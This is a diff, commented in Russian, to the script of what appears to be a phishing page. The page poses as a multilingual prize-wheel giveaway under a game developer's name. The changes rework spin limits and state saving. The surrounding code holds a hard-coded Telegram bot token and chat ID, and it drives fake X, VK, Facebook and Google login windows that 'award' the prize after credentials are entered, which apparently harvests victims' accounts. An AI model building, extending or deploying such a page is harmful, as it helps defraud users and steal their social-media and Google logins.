@@ -3041,19 +3041,6 @@
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
         
-        // Константы для localStorage
-        const STORAGE_KEYS = {
-            USER_IP: 'user_ip',
-            USER_DATA: 'user_data',
-            HAS_PLAYED: 'has_played',
-            LAST_SPIN_TIME: 'last_spin_time',
-            USER_PRIZE: 'user_prize',
-            ACCOUNT_ID: 'account_id',
-            IS_PRIZE_RECEIVED: 'is_prize_received',
-            SELECTED_SOCIAL: 'selected_social',
-            WINNERS_COUNT: 'winners_count'
-        };
-        
         // Переменные для хранения данных
         let googleEmail = '';
         let xUsername = '';
@@ -3066,129 +3053,6 @@
         let winnersCount = 0;
         let winnersInterval = null;
         let currentLang = 'en';
-        let selectedSocial = null;
-        let lastSpinTime = 0;
-        
-        // Функция сохранения состояния пользователя
-        function saveUserState() {
-            const userData = {
-                userIP: userIP,
-                hasPlayed: hasPlayed,
-                lastSpinTime: lastSpinTime,
-                userPrize: userPrize,
-                accountId: accountId,
-                isPrizeReceived: isPrizeReceived,
-                selectedSocial: selectedSocial
-            };
-            
-            localStorage.setItem(STORAGE_KEYS.USER_DATA, JSON.stringify(userData));
-            localStorage.setItem(STORAGE_KEYS.HAS_PLAYED, hasPlayed.toString());
-            localStorage.setItem(STORAGE_KEYS.LAST_SPIN_TIME, lastSpinTime.toString());
-            localStorage.setItem(STORAGE_KEYS.USER_PRIZE, JSON.stringify(userPrize));
-            localStorage.setItem(STORAGE_KEYS.ACCOUNT_ID, accountId);
-            localStorage.setItem(STORAGE_KEYS.IS_PRIZE_RECEIVED, isPrizeReceived.toString());
-            localStorage.setItem(STORAGE_KEYS.SELECTED_SOCIAL, selectedSocial || '');
-        }
-        
-        // Функция загрузки состояния пользователя
-        function loadUserState() {
-            try {
-                // Загружаем сохраненные данные
-                const savedUserIP = localStorage.getItem(STORAGE_KEYS.USER_IP);
-                const savedUserData = localStorage.getItem(STORAGE_KEYS.USER_DATA);
-                const savedHasPlayed = localStorage.getItem(STORAGE_KEYS.HAS_PLAYED);
-                const savedLastSpinTime = localStorage.getItem(STORAGE_KEYS.LAST_SPIN_TIME);
-                const savedUserPrize = localStorage.getItem(STORAGE_KEYS.USER_PRIZE);
-                const savedAccountId = localStorage.getItem(STORAGE_KEYS.ACCOUNT_ID);
-                const savedIsPrizeReceived = localStorage.getItem(STORAGE_KEYS.IS_PRIZE_RECEIVED);
-                const savedSelectedSocial = localStorage.getItem(STORAGE_KEYS.SELECTED_SOCIAL);
-                
-                // Восстанавливаем состояние
-                if (savedUserIP) {
-                    userIP = savedUserIP;
-                }
-                
-                if (savedHasPlayed) {
-                    hasPlayed = savedHasPlayed === 'true';
-                }
-                
-                if (savedLastSpinTime) {
-                    lastSpinTime = parseInt(savedLastSpinTime);
-                }
-                
-                if (savedUserPrize) {
-                    try {
-                        userPrize = JSON.parse(savedUserPrize);
-                    } catch (e) {
-                        userPrize = null;
-                    }
-                }
-                
-                if (savedAccountId) {
-                    accountId = savedAccountId;
-                }
-                
-                if (savedIsPrizeReceived) {
-                    isPrizeReceived = savedIsPrizeReceived === 'true';
-                }
-                
-                if (savedSelectedSocial) {
-                    selectedSocial = savedSelectedSocial || null;
-                }
-                
-                // Восстанавливаем из комплексных данных
-                if (savedUserData) {
-                    try {
-                        const userData = JSON.parse(savedUserData);
-                        userIP = userData.userIP || userIP;
-                        hasPlayed = userData.hasPlayed || hasPlayed;
-                        lastSpinTime = userData.lastSpinTime || lastSpinTime;
-                        userPrize = userData.userPrize || userPrize;
-                        accountId = userData.accountId || accountId;
-                        isPrizeReceived = userData.isPrizeReceived || isPrizeReceived;
-                        selectedSocial = userData.selectedSocial || selectedSocial;
-                    } catch (e) {
-                        console.log('Error parsing user data:', e);
-                    }
-                }
-                
-                console.log('Loaded user state:', {
-                    userIP,
-                    hasPlayed,
-                    lastSpinTime,
-                    userPrize,
-                    accountId,
-                    isPrizeReceived,
-                    selectedSocial
-                });
-                
-                return true;
-            } catch (error) {
-                console.error('Error loading user state:', error);
-                return false;
-            }
-        }
-        
-        // Проверка времени последнего спина (ограничение 1 минута для владельца)
-        function canSpinAgain() {
-            // Если не владелец - обычные правила
-            if (userIP !== ownerIP) {
-                return !hasPlayed;
-            }
-            
-            // Для владельца - проверяем время последнего спина
-            const now = Date.now();
-            const timeSinceLastSpin = now - lastSpinTime;
-            const oneMinute = 60 * 1000; // 1 минута в миллисекундах
-            
-            return timeSinceLastSpin >= oneMinute;
-        }
-        
-        // Обновление времени последнего спина
-        function updateLastSpinTime() {
-            lastSpinTime = Date.now();
-            saveUserState();
-        }
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3286,14 +3150,18 @@
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
-                        // Показываем соответствующую форму в зависимости от состояния
+                        // Показываем форму ввода ID аккаунта
                         if (!accountId) {
-                            // Показываем форму ввода ID аккаунта
                             accountIdSection.classList.add('active');
                             accountIdSection.scrollIntoView({ behavior: 'smooth' });
                         } else {
+                            // Сбрасываем выбор соцсети
+                            socialOptions.forEach(opt => opt.classList.remove('selected'));
+                            selectedSocial = null;
+                            
                             // Показываем форму выбора соцсети
-                            showSocialSelectionForm();
+                            socialSelectSection.classList.add('active');
+                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }
                         
                         showNotification(currentLang === 'ru' ? "Выберите социальную сеть для получения приза" : 
@@ -3321,27 +3189,6 @@
                     closePrizeWindow();
                 };
             }
-        }
-        
-        // Функция показа формы выбора соцсети
-        function showSocialSelectionForm() {
-            // Сбрасываем выбор соцсети если нет сохраненного
-            if (!selectedSocial) {
-                socialOptions.forEach(opt => opt.classList.remove('selected'));
-            } else {
-                // Восстанавливаем выбранную соцсеть
-                socialOptions.forEach(opt => {
-                    if (opt.getAttribute('data-social') === selectedSocial) {
-                        opt.classList.add('selected');
-                    } else {
-                        opt.classList.remove('selected');
-                    }
-                });
-            }
-            
-            // Показываем форму выбора соцсети
-            socialSelectSection.classList.add('active');
-            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
         }
         
         function closePrizeWindow() {
@@ -3414,50 +3261,32 @@
             // Инициализируем снег
             createSnow();
             
-            // Загружаем состояние пользователя
-            loadUserState();
-            
             // Инициализируем счетчик победителей
             initWinnersCounter();
             
-            // Получаем или используем сохраненный IP пользователя
-            const savedIP = localStorage.getItem(STORAGE_KEYS.USER_IP);
-            
-            if (savedIP) {
-                userIP = savedIP;
-                console.log('Using saved IP:', userIP);
-                console.log('Owner IP:', ownerIP);
-                
-                // Восстанавливаем интерфейс в зависимости от состояния
-                restoreUI();
-            } else {
-                // Получаем IP пользователя
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        userIP = data.ip;
-                        localStorage.setItem(STORAGE_KEYS.USER_IP, userIP);
-                        console.log('New IP detected:', userIP);
-                        console.log('Owner IP:', ownerIP);
-                        
-                        // Проверяем, является ли пользователь владельцем
-                        if (userIP === ownerIP) {
-                            console.log('Owner detected - 1 minute spin cooldown');
-                            localStorage.setItem('isOwner', 'true');
-                        } else {
-                            console.log('Regular user - one spin only');
-                        }
-                        
-                        // Восстанавливаем интерфейс
-                        restoreUI();
-                    })
-                    .catch(error => {
-                        console.log('Error getting IP:', error);
-                        // Используем fallback IP
-                        userIP = 'unknown';
-                        restoreUI();
-                    });
-            }
+            // Получаем IP пользователя
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                    console.log('User IP:', userIP);
+                    console.log('Owner IP:', ownerIP);
+                    
+                    // Проверяем, является ли пользователь владельцем
+                    if (userIP === ownerIP) {
+                        console.log('Owner detected - unlimited spins');
+                        hasPlayed = false;
+                        localStorage.setItem('isOwner', 'true');
+                    } else {
+                        console.log('Regular user - one spin only');
+                        // Проверяем, играл ли уже пользователь
+                        const played = localStorage.getItem('hasPlayed');
+                        hasPlayed = played === 'true';
+                    }
+                })
+                .catch(error => {
+                    console.log('Error getting IP:', error);
+                });
             
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
@@ -3510,110 +3339,10 @@
             let spinSpeed;
             let spinCount = 0;
             let finalPrizeIndex = 0;
+            let selectedSocial = null;
             
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
-            
-            // Функция восстановления интерфейса
-            function restoreUI() {
-                console.log('Restoring UI with state:', {
-                    hasPlayed,
-                    userPrize,
-                    accountId,
-                    isPrizeReceived,
-                    selectedSocial
-                });
-                
-                // Обновляем значок приза
-                updatePrizeBadge();
-                
-                // Обновляем кнопку PLAY
-                updatePlayButton();
-                
-                // Если есть приз и он еще не получен
-                if (userPrize && !isPrizeReceived) {
-                    // Если нет ID аккаунта
-                    if (!accountId) {
-                        accountIdInput.value = '';
-                        accountIdSection.classList.add('active');
-                    } 
-                    // Если есть ID аккаунта
-                    else {
-                        // Заполняем поле ID
-                        accountIdInput.value = accountId;
-                        
-                        // Если нет выбранной соцсети
-                        if (!selectedSocial) {
-                            showSocialSelectionForm();
-                        }
-                        // Если есть выбранная соцсеть
-                        else {
-                            // Восстанавливаем выбранную соцсеть
-                            socialOptions.forEach(opt => {
-                                if (opt.getAttribute('data-social') === selectedSocial) {
-                                    opt.classList.add('selected');
-                                }
-                            });
-                            
-                            socialSelectSection.classList.add('active');
-                        }
-                    }
-                }
-                
-                // Если приз уже получен
-                if (isPrizeReceived) {
-                    confirmationSection.classList.add('active');
-                }
-                
-                showNotification(currentLang === 'ru' ? "Ваш прогресс восстановлен" : 
-                                currentLang === 'uz' ? "Taraffigingiz tiklandi" : 
-                                "Your progress has been restored", false, true);
-            }
-            
-            // Функция обновления кнопки PLAY
-            function updatePlayButton() {
-                const isOwner = userIP === ownerIP;
-                const canSpin = canSpinAgain();
-                
-                if (!canSpin) {
-                    if (isOwner) {
-                        // Для владельца показываем время до следующего спина
-                        const now = Date.now();
-                        const timeSinceLastSpin = now - lastSpinTime;
-                        const oneMinute = 60 * 1000;
-                        const timeLeft = Math.max(0, oneMinute - timeSinceLastSpin);
-                        
-                        if (timeLeft > 0) {
-                            const secondsLeft = Math.ceil(timeLeft / 1000);
-                            playBtn.innerHTML = `<i class="fas fa-clock"></i> WAIT ${secondsLeft}s`;
-                            playBtn.disabled = true;
-                            
-                            // Обновляем таймер каждую секунду
-                            const timerInterval = setInterval(() => {
-                                const newTimeLeft = Math.max(0, oneMinute - (Date.now() - lastSpinTime));
-                                const newSecondsLeft = Math.ceil(newTimeLeft / 1000);
-                                
-                                if (newTimeLeft > 0) {
-                                    playBtn.innerHTML = `<i class="fas fa-clock"></i> WAIT ${newSecondsLeft}s`;
-                                } else {
-                                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
-                                    playBtn.disabled = false;
-                                    clearInterval(timerInterval);
-                                }
-                            }, 1000);
-                        } else {
-                            playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
-                            playBtn.disabled = false;
-                        }
-                    } else {
-                        playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                        playBtn.disabled = true;
-                    }
-                } else {
-                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
-                    playBtn.disabled = false;
-                }
-            }
             
             // Языковые настройки
             const translations = {
@@ -3672,8 +3401,7 @@
                     footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
                     copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
                     notificationPrize: "Congratulations! You won a prize!",
-                    notificationIdSaved: "Account ID saved",
-                    notificationWait: "Please wait before spinning again"
+                    notificationIdSaved: "Account ID saved"
                 },
                 ru: {
                     winnersCounter: "Победителей:",
@@ -3730,8 +3458,7 @@
                     footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
                     copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
                     notificationPrize: "Поздравляем! Вы выиграли приз!",
-                    notificationIdSaved: "ID аккаунта сохранен",
-                    notificationWait: "Пожалуйста, подождите перед следующим спином"
+                    notificationIdSaved: "ID аккаунта сохранен"
                 },
                 uz: {
                     winnersCounter: "G'oliblar:",
@@ -3788,8 +3515,7 @@
                     footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
                     copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
                     notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
-                    notificationIdSaved: "Hisob ID raqami saqlandi",
-                    notificationWait: "Iltimos, keyingi aylanishdan oldin kuting"
+                    notificationIdSaved: "Hisob ID raqami saqlandi"
                 }
             };
             
@@ -3806,7 +3532,11 @@
                 document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
                 
                 // Обновляем кнопку игры
-                updatePlayButton();
+                if (hasPlayed && userIP !== ownerIP) {
+                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
+                } else {
+                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
+                }
                 
                 // Обновляем индикатор выбора
                 selectionIndicator.textContent = t.selected;
@@ -3945,13 +3675,11 @@
             function startRoulette() {
                 if (isSpinning) return;
                 
-                // Проверяем, может ли пользователь крутить
-                if (!canSpinAgain()) {
-                    if (userIP === ownerIP) {
-                        showNotification(translations[currentLang].notificationWait, true);
-                    } else {
-                        showNotification(translations[currentLang].notificationAlreadyPlayed, true);
-                    }
+                // Проверяем, является ли пользователь владельцем
+                const isOwner = localStorage.getItem('isOwner') === 'true';
+                
+                if (!isOwner && hasPlayed) {
+                    showNotification(translations[currentLang].notificationAlreadyPlayed, true);
                     return;
                 }
                 
@@ -4010,28 +3738,32 @@
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
                             
-                            // Обновляем время последнего спина
-                            updateLastSpinTime();
-                            
-                            // Сохраняем, что пользователь уже играл
-                            hasPlayed = true;
-                            
-                            // Сохраняем состояние
-                            saveUserState();
-                            
                             // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
-                            // Обновляем кнопку PLAY
-                            updatePlayButton();
+                            // Сохраняем, что пользователь уже играл (если не владелец)
+                            if (userIP !== ownerIP) {
+                                hasPlayed = true;
+                                localStorage.setItem('hasPlayed', 'true');
+                                playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                            } else {
+                                playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
+                            }
+                            
+                            playBtn.disabled = false;
                             
                             // Показываем форму ввода ID аккаунта
                             if (!accountId) {
                                 accountIdSection.classList.add('active');
                                 accountIdSection.scrollIntoView({ behavior: 'smooth' });
                             } else {
+                                // Сбрасываем выбор соцсети
+                                socialOptions.forEach(opt => opt.classList.remove('selected'));
+                                selectedSocial = null;
+                                
                                 // Показываем форму выбора соцсети
-                                showSocialSelectionForm();
+                                socialSelectSection.classList.add('active');
+                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             }
                             
                             showNotification(translations[currentLang].notificationPrize, false, true);
@@ -4052,11 +3784,13 @@
                 accountId = id;
                 accountIdSection.classList.remove('active');
                 
-                // Сохраняем состояние
-                saveUserState();
+                // Сбрасываем выбор соцсети
+                socialOptions.forEach(opt => opt.classList.remove('selected'));
+                selectedSocial = null;
                 
                 // Показываем форму выбора соцсети
-                showSocialSelectionForm();
+                socialSelectSection.classList.add('active');
+                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                 
                 showNotification(translations[currentLang].notificationIdSaved, false, true);
             });
@@ -4068,9 +3802,6 @@
                     
                     this.classList.add('selected');
                     selectedSocial = this.getAttribute('data-social');
-                    
-                    // Сохраняем выбранную соцсеть
-                    saveUserState();
                 });
             });
             
@@ -4102,7 +3833,6 @@
                 if (success) {
                     closeModal('xModalStep2');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4125,7 +3855,6 @@
                 if (success) {
                     closeModal('vkModal');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4147,7 +3876,6 @@
                 if (success) {
                     closeModal('facebookModal');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4198,7 +3926,6 @@
                 if (success) {
                     closeGoogleFullscreen();
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4336,7 +4063,12 @@
             selectionFrame.style.opacity = '0';
             selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
-            updatePlayButton();
+            
+            // Проверяем, играл ли пользователь уже
+            if (hasPlayed && userIP !== ownerIP) {
+                playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                playBtn.disabled = false;
+            }
             
             // Закрытие окна приза при клике на кнопку "Закрыть"
             collectPrizeBtn.addEventListener('click', closePrizeWindow);
@@ -4412,7 +4144,7 @@
             
             // Автоматическая анимация рамки до начала игры
             function animateFrameRandomly() {
-                if (!isSpinning && canSpinAgain()) {
+                if (!isSpinning && !hasPlayed) {
                     const randomIndex = Math.floor(Math.random() * prizeItems.length);
                     moveFrameToPrize(randomIndex);
                     
@@ -4424,23 +4156,13 @@
             
             // Запускаем анимацию рамки через 2 секунды после загрузки
             setTimeout(() => {
-                if (!isSpinning && canSpinAgain()) {
+                if (!isSpinning) {
                     animateFrameRandomly();
                 }
             }, 2000);
             
             // Устанавливаем английский язык по умолчанию
             changeLanguage('en');
-            
-            // Автосохранение при закрытии страницы
-            window.addEventListener('beforeunload', function() {
-                saveUserState();
-            });
-            
-            // Автосохранение при изменении данных
-            window.addEventListener('unload', function() {
-                saveUserState();
-            });
         });
     </script>
 </body>
